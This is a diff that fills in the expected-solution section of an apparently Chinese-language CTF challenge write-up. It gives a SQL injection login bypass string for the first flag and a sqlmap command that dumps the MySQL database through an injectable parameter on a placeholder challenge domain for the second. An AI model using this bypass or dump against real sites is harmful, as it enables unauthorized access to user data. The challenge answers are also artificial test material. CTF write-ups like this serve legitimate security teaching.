@@ -21,4 +21,13 @@
 
 ## 预期解法
 
-TODO: 出题人题解，后面可以按需增加更多的二级标题
+### flag1
+
+第一步，打开题目，第二步，按下admin ' or 1='1，第三步，按下登录，好了flag拿到了（？
+
+### flag2
+
+flag2就需要知道密码是啥了，这次比赛使用sqlmap就行。
+```console
+sqlmap -u "http://DOMAIN_SUFFIX.weilei.software/check.php?data=user:*|pass:*" --dbms=mysql --dump
+```
